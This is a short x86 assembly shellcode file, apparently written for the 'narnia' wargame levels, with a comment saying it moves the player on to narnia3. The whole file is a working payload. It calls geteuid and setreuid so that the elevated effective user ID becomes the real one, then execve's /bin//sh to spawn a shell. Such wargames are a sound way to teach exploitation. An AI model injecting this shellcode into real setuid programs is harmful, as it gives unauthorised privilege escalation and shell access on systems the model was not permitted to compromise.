# Sets euid/ruid to narnia3's and pops a shell to move onto the next level.

section .text
	global _start

_start:
	xor eax, eax		# clear eax
	mov al, 0xc9		# geteuid syscall number
	int 0x80		# perform geteuid syscall
	mov ebx, eax		# put ret val of geteuid to ruid parameter
	mov ecx, eax		# put ret val of geteuid to euid parameter
	xor eax, eax		# clear eax for setreuid syscall number
	mov al, 0xcb		# setreuid syscall number
	int 0x80		# perform setreuid syscall
	xor eax, eax		# clear eax and get ready to pop a shell
	push eax		# push a NULL byte
	push 0x68732f2f		# push "//sh"
	push 0x6e69622f		# push "/bin"
	mov al, 0xb		# execv syscall number
	mov ebx, esp		# put addr of "/bin//sh" into ebx
	xor ecx, ecx		# no additional args
	xor edx, edx		# no additional args
	int 0x80		# perform execv syscall

